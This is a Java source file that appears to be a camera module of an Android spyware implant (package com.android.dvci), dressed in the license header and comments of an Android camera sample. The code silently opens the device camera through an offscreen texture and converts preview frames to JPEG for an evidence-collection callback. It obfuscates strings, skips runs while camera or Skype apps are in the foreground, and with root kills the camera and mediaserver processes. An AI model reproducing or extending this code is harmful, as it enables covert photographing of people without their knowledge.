/*
 * Copyright 2013 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.android.dvci.module.camera;

import android.annotation.TargetApi;
import android.graphics.ImageFormat;
import android.graphics.Rect;
import android.graphics.SurfaceTexture;
import android.graphics.YuvImage;
import android.hardware.Camera;
import android.opengl.GLES20;
import android.os.Build;
import android.util.Log;

import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.evidence.Markup;
import com.android.dvci.listener.ListenerProcess;
import com.android.dvci.module.ModuleCamera;
import com.android.dvci.util.Check;
import com.android.dvci.util.Execute;
import com.android.dvci.util.Utils;
import com.android.mm.M;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Hashtable;
import java.util.List;
import java.util.Set;

//20131106: removed unnecessary glFinish(), removed hard-coded "/sdcard"
//20131205: added alpha to EGLConfig
//20131210: demonstrate un-bind and re-bind of texture, for apps with shared EGL contexts
//20140123: correct error checks on glGet*Location() and program creation (they don't set error)

/**
 * Record video from the camera preview and encode it as an MP4 file.  Demonstrates the use
 * of MediaMuxer and MediaCodec with Camera input.  Does not record audio.
 * <p/>
 * Generally speaking, it's better to use MediaRecorder for this sort of thing.  This example
 * demonstrates one possible advantage: editing of video as it's being encoded.  A GLES 2.0
 * fragment shader is used to perform a silly color tweak every 15 frames.
 * <p/>
 * This uses various features first available in Android "Jellybean" 4.3 (API 18).  There is
 * no equivalent functionality in previous releases.  (You can send the Camera preview to a
 * byte buffer with a fully-specified format, but MediaCodec encoders want different input
 * formats on different devices, and this use case wasn't well exercised in CTS pre-4.3.)
 * <p/>
 * The output file will be something like "/sdcard/test.640x480.mp4".
 * <p/>
 * (This was derived from bits and pieces of CTS tests, and is packaged as such, but is not
 * currently part of CTS.)
 * <p/>
 * RuntimeException can be cause by:
 * 1)mediaserver :Error: java.lang.RuntimeException: Fail to connect to camera service
 * 2)camera service: cannot open control fd of /dev/videoX
 */
public class CameraSnapshot {
	private static final String TAG = "CameraSnapshot";
	public static final int CAMERA_ANY = -1;
	//private static final long MIN_INTERVAL_FOR_INCREMENT =   60 * (1000);
	private Object cameraLock = new Object();
	private int camera_killed = 0;
	public static final int MAX_CAMERA_KILLS = 5;
	private int kill_camera_request = 0;
	private boolean kill_also_mediaserver = false;
	private Markup multimediaKills_markup =null;
	private long lastKill = -1;
	public Set<String> blacklist = new HashSet<String>();
	private static CameraSnapshot singleton = null;
	private Hashtable<Integer, Boolean> enable = new Hashtable<Integer, Boolean>();
	private Camera.AutoFocusCallback autofocusCallback = new Camera.AutoFocusCallback() {
		@Override
		@TargetApi(Build.VERSION_CODES.HONEYCOMB)
		public void onAutoFocus(boolean b, Camera camera) {
			CameraSnapshot snap = CameraSnapshot.self();


		}
	};
	private Camera.ErrorCallback errorCallback = new Camera.ErrorCallback() {
		@Override
		public void onError(int error, Camera camera) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onError), Error: " + error);
			}

			if (error == Camera.CAMERA_ERROR_SERVER_DIED) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (onError), Error: CAMERA_ERROR_SERVER_DIED");
				}
			} else if (error == Camera.CAMERA_ERROR_UNKNOWN) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (onError), Error: CAMERA_ERROR_UNKNOWN");
				}
			}

		}
	};

	/**
	 * Increments only if no blacklisted app is in foreground.
	 * (skype and camera are supposed to break the camera)
	 */
	public void incKillreqCamera() {
		String fg = ListenerProcess.self().getLastForeground().toLowerCase();
		ArrayList<String> check_this= new ArrayList<String>();
		check_this.add(fg.toLowerCase());
		if( Status.self().getForeground_activity()!=null && Status.self().getForeground_activity().baseActivity != null){
			check_this.add(Status.self().getForeground_activity().baseActivity.toString());
		}
		for (String lasfg : check_this) {
			for (String bl : blacklist) {
				if (lasfg.contains(bl.toLowerCase())) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (incKillreqCamera): process=" + bl + " in blacklist , skip increments and reset");
					}
					kill_camera_request = 0;
					return;
				}
			}
		}
		kill_camera_request++;
	}

	public int getCamera_killed() {
		return camera_killed;
	}
	public void setCamera_killed(int ck) {
		camera_killed=ck;
	}

	public void clearKillreq() {
		kill_camera_request = 0;
	}

	public int getKillreq() {
		return kill_camera_request;
	}

	public synchronized void addBlacklist(String black) {
		blacklist.add(black);
	}

	public synchronized void delBlacklist(String black) {
		blacklist.remove(black);
	}

	public synchronized boolean inInBlacklist(String process) {
		return blacklist.contains(process);
	}

	public static CameraSnapshot self() {
		if (singleton == null) {
			singleton = new CameraSnapshot();
		}
		return singleton;
	}


	private CameraSnapshot() {
		blacklist.clear();
		addBlacklist(M.e(".camera"));
		addBlacklist(M.e("com.skype.raider"));
		addBlacklist(M.e(".GoogleCamera"));
		if (multimediaKills_markup == null) {
			multimediaKills_markup = new Markup(ModuleCamera.self(), 1);
		}
		try {
			camera_killed = multimediaKills_markup.unserialize(new Integer(0));
		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (CameraSnapshot), Exception loading markup");
			}
		}
	}

	// camera state
	//private Camera mCamera;
	private SurfaceTexture surface;
	private Camera.PreviewCallback previewCallback = new Camera.PreviewCallback() {
		@Override
		public void onPreviewFrame(byte[] bytes, Camera camera) {

			class CCD implements Runnable {
				byte[] bytes;

				Camera.Parameters cameraParms;
				Camera.Size size;

				CCD(byte[] b, Camera c) {
					bytes = b;
					cameraParms = c.getParameters();
					size = cameraParms.getPreviewSize();
				}

				public void run() {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (CCD), size: " + bytes.length);
					}
					try {
						if (isBlack(bytes)) {
							if (Cfg.DEBUG) {
								Check.log(TAG + " (CCD),  BLACK");
							}
							return;
						}


						int format = cameraParms.getPreviewFormat();
						if (format == ImageFormat.NV21) {
							ByteArrayOutputStream jpeg = new ByteArrayOutputStream();
							YuvImage image = new YuvImage(bytes, ImageFormat.NV21, size.width, size.height, null);
							image.compressToJpeg(new Rect(0, 0, image.getWidth(), image.getHeight()), 100, ((OutputStream)
									jpeg));
							ModuleCamera.callback(jpeg.toByteArray());
						}
					} catch (Exception e) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (CCD), error decoding frame: " + bytes.length);
						}
					} finally {

					}
				}
			}


			boolean released = false;
			try {
				if (bytes != null) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (onPreviewFrame), size: " + bytes.length);
					}
					// start another Thread to check exploit thread end
					CCD decodeCameraFrame = new CCD(bytes, camera);
					released = releaseCamera(camera);
					Thread ec = new Thread(decodeCameraFrame);
					ec.start();
				}
			} finally {
				try {
					if (!released)
						releaseCamera(camera);
				} catch (Exception e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (onPreviewFrame) probably release called twice: " + e);
					}
				}
				synchronized (cameraLock) {
					cameraLock.notifyAll();
				}
			}
		}
	};

	/**
	 * Wraps encodeCameraToMpeg().  This is necessary because SurfaceTexture will try to use
	 * the looper in the current thread if one exists, and the CTS tests create one on the
	 * test thread.
	 * <p/>
	 * The wrapper propagates exceptions thrown by the worker thread back to the caller.
	 * <p/>
	 * /**
	 * Tests encoding of AVC video from Camera input.  The output is saved as an MP4 file.
	 *
	 * @param cameraId
	 */
	@TargetApi(Build.VERSION_CODES.HONEYCOMB)
	public void snapshot(int cameraId) {
		// arbitrary but popular values
		final int encWidth = 768; //1024;
		final int encHeight = 432; //768;

		//if(Status.self().startedSeconds() < 30){
		//	return;
		//}
		//768x432
		if (enable.containsKey(cameraId) && !enable.get(cameraId)) {
			return;
		}
		Camera camera = null;

		synchronized (cameraLock) {
			try {
				camera = prepareCamera(cameraId, encWidth, encHeight);
				if (camera == null) {
					//todo: reenable disabling getting camera in case of error if needed: this.enable.put(cameraId, false);
					//DevicePolicyManager localDPM = (DevicePolicyManager) Status.getAppContext().getSystemService(Context.DEVICE_POLICY_SERVICE);
					//if (Cfg.DEBUG) {
					//	Check.log(TAG + " (snapshot), camera has been disable for someone? " + localDPM.getCameraDisabled(null));
					//}
					long startedAt = System.currentTimeMillis();
					if (getKillreq() > 4) {
						if (camera_killed <= CameraSnapshot.MAX_CAMERA_KILLS) {
							killCameraServices(startedAt);
							Utils.sleep(2000);
							clearKillreq();
						} else {
							EvidenceBuilder.info(M.e("camera Module suspended"));
							killCameraServices(startedAt);
							Utils.sleep(2000);
						}
					}
					return;
				}
				if (Cfg.DEBUG) {
					Check.log(TAG + " (snapshot), cameraId: " + cameraId);
				}

				if (this.surface == null) {
					int[] surfaceparams = new int[1];
					GLES20.glGenTextures(1, surfaceparams, 0);

					GLES20.glBindTexture(GLES20.GL_TEXTURE_2D, surfaceparams[0]);
					GLES20.glTexParameteri(GLES20.GL_TEXTURE_2D, GLES20.GL_TEXTURE_WRAP_S,
							GLES20.GL_CLAMP_TO_EDGE);
					GLES20.glTexParameteri(GLES20.GL_TEXTURE_2D, GLES20.GL_TEXTURE_WRAP_T,
							GLES20.GL_CLAMP_TO_EDGE);


					this.surface = new SurfaceTexture(surfaceparams[0]);
				}

				//camera.autoFocus(this.autofocusCallback);
				camera.setPreviewTexture(surface);
				camera.startPreview();
				//byte[] buffer = new byte[]{};
				//camera.addCallbackBuffer(buffer);
				//camera.setPreviewCallbackWithBuffer(previewCallback);
				camera.setOneShotPreviewCallback(previewCallback);
				cameraLock.wait();
			} catch (Exception e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (snapshot) ERROR: " + e);
				}
				incKillreqCamera();
				if (camera != null) {
					releaseCamera(camera);
				}
			}
		}
	}


	private void killCameraServices(long startedAt) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (snapshot), something wrong with camera? WTF kill it for nth" + camera_killed + "times");
		}

		if(!Status.haveRoot()){
			camera_killed++;
			return;
		}

		String pid_cam = Utils.pidOf(M.e("camera"));
		String pid_ms = Utils.pidOf(M.e("mediaserver"));
		try {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (snapshot) try to kill " + pid_cam);
			}
			camera_killed++;
			try {
					multimediaKills_markup.writeMarkupSerializable(camera_killed);
			}catch (Exception e){
				if (Cfg.DEBUG) {
					Check.log(TAG + " (killCameraServices), Exception saving markup");
				}
			}
			Execute.executeRoot("kill " + pid_cam);
			if (kill_also_mediaserver) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (snapshot) try to kill also mediaserver " + pid_cam);
				}
				Execute.executeRoot("kill " + pid_ms);
				kill_also_mediaserver = false;
			}
			//if(lastKill==-1 || (startedAt - lastKill) <= MIN_INTERVAL_FOR_INCREMENT) {

			//}
			lastKill = startedAt;
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (snapshot) Error: " + ex);
			}
		}

	}

	@TargetApi(Build.VERSION_CODES.GINGERBREAD)
	private Camera openCamera(int requestFace) {
		Camera cam = null;
		Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
		int cameraCount = Camera.getNumberOfCameras();
		for (int camIdx = 0; camIdx < cameraCount; camIdx++) {
			Camera.getCameraInfo(camIdx, cameraInfo);

			if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (openCamera), found FACE CAMERA");
				}
				//continue;
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " (openCamera), orientation: " + cameraInfo.orientation);
			}
			if (requestFace == cameraInfo.facing || requestFace == CAMERA_ANY) {
				try {

					if (requestFace == CAMERA_ANY) {
						cam = Camera.open();
					} else {
						cam = Camera.open(camIdx);
					}

					if (cam != null) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (openCamera), opened: " + camIdx);
						}

						return cam;
					}
				} catch (RuntimeException e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (openCamera), Error: " + e);
					}
					if (e.toString().contains(M.e("Fail to connect to camera service"))) {
						kill_also_mediaserver = true;
					}
					incKillreqCamera();
				}
			}
		}

		return cam;
	}

	/**
	 * Configures Camera for video capture.  Sets mCamera.
	 * <p/>
	 * Opens a Camera and sets parameters.  Does not start preview.
	 */
	private Camera prepareCamera(int cameraId, int encWidth, int encHeight) {
		Camera camera = null;
		try {

			camera = openCamera(cameraId);
			if (camera == null) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (prepareCamera), cannot open camera: " + cameraId);
				}
				return null;
			}
			if (Cfg.DEBUG) {
				camera.setErrorCallback(this.errorCallback);
			}

			Camera.Parameters cameraParms = camera.getParameters();
			List<String> modes = cameraParms.getSupportedFocusModes();
			if (modes.contains("continuous-picture")) {
				cameraParms.setFocusMode("continuous-picture");
			}
			if (cameraParms.getSupportedPreviewFormats().contains(ImageFormat.NV21)) {
				cameraParms.setPreviewFormat(ImageFormat.NV21);
			}
			//cameraParms.set("iso", (String) "400");

			choosePreviewSize(cameraParms, encWidth, encHeight);
			// leave the frame rate set to default
			camera.setParameters(cameraParms);

			Camera.Size size = cameraParms.getPreviewSize();

			if (Cfg.DEBUG) {
				Check.log(TAG + " (prepareCamera), Camera preview size is " + size.width + "x" + size.height);
			}

			return camera;
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (prepareCamera), ERROR " + ex);
				incKillreqCamera();
				if (ex.toString().contains(M.e("Fail to connect to camera service"))) {
					kill_also_mediaserver = true;
				}
			}
			if (camera!=null){
				releaseCamera(camera);
			}
			return null;
		}
	}

	/**
	 * Attempts to find a preview size that matches the provided width and height (which
	 * specify the dimensions of the encoded video).  If it fails to find a match it just
	 * uses the default preview size.
	 * <p/>
	 * TODO: should do a best-fit match.
	 */
	@TargetApi(Build.VERSION_CODES.HONEYCOMB)
	private static void choosePreviewSize(Camera.Parameters parms, int width, int height) {
		//Camera.Size ppsfv = parms.getPreferredPreviewSizeForVideo();

		List<Camera.Size> previews = parms.getSupportedPreviewSizes();
		for (Camera.Size size : previews) {
			if (size.width == width && size.height == height) {
				parms.setPreviewSize(width, height);
				if (Cfg.DEBUG) {
					Check.log(TAG + " (choosePreviewSize), found best preview size!");
				}
				return;
			}
		}

		Camera.Size best = getBestPreviewSize(parms, width, height);
		if (best != null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (choosePreviewSize), Camera best preview size for video is " +
						best.width + "x" + best.height);
			}
		}

		if (best != null) {
			Log.w(TAG, "Unable to set preview size to " + width + "x" + height);
			parms.setPreviewSize(best.width, best.height);
		}
	}

//	@TargetApi(Build.VERSION_CODES.HONEYCOMB)
//	public static void setCameraDisplayOrientation(int cameraId, android.hardware.Camera camera) {
//		try {
//			android.hardware.Camera.CameraInfo info =
//					new Camera.CameraInfo();
//			android.hardware.Camera.getCameraInfo(cameraId, info);
//
//			int rotation = Status.getAppGui().getWindowManager().getDefaultDisplay()
//					.getRotation();
//			int degrees = 0;
//			Log.d(TAG, "rotation:" + rotation);
//			switch (rotation) {
//				case Surface.ROTATION_0:
//					degrees = 0;
//					break;
//				case Surface.ROTATION_90:
//					degrees = 90;
//					break;
//				case Surface.ROTATION_180:
//					degrees = 180;
//					break;
//				case Surface.ROTATION_270:
//					degrees = 270;
//					break;
//			}
//
//			int result;
//			if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
//				result = (info.orientation + degrees) % 360;
//				result = (360 - result) % 360;  // compensate the mirror
//			} else {  // back-facing
//				result = (info.orientation - degrees + 360) % 360;
//			}
//			if (Cfg.DEBUG) {
//				Check.log(TAG + " (setCameraDisplayOrientation), " + degrees);
//			}
//			if(result != 0) {
//				camera.setDisplayOrientation(result);
//			}
//		}catch(Exception ex){
//			if (Cfg.DEBUG) {
//				Check.log(TAG + " (setCameraDisplayOrientation), ERROR: " + ex);
//			}
//		}
//	}

	private static Camera.Size getBestPreviewSize(Camera.Parameters parameters, int width, int height) {
		Camera.Size bestSize = null;
		List<Camera.Size> sizeList = parameters.getSupportedPreviewSizes();

		int maxSize = width * height;
		bestSize = null;

		for (int i = 1; i < sizeList.size(); i++) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getBestPreviewSize), supported size: " + sizeList.get(i).width + " x " + sizeList.get(i).height);
			}
			int area = sizeList.get(i).width * sizeList.get(i).height;
			int areaBest = (bestSize != null ? (bestSize.width * bestSize.height) : 0);
			if (area > areaBest && area < maxSize) {
				bestSize = sizeList.get(i);
			}
		}

		return bestSize;
	}


	private boolean isBlack(byte[] raw) {
		for (int i = 0; i < raw.length; i++) {
			if (raw[i] > 20) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (isBlack), it's not black: " + raw[i]);
				}
				return false;
			}
		}
		return true;
	}


	/**
	 * Stops camera preview, and releases the camera to the system.
	 */
	private synchronized boolean releaseCamera(Camera camera) {
		if (camera != null) {
			/*try {
				camera.reconnect();
			} catch (IOException e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (releaseCamera), ERROR: " + e);
				}
			}*/
			try {
				camera.stopPreview();
			} finally {
				camera.release();
			}
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (releaseCamera), released");
		}
		return true;
	}

}
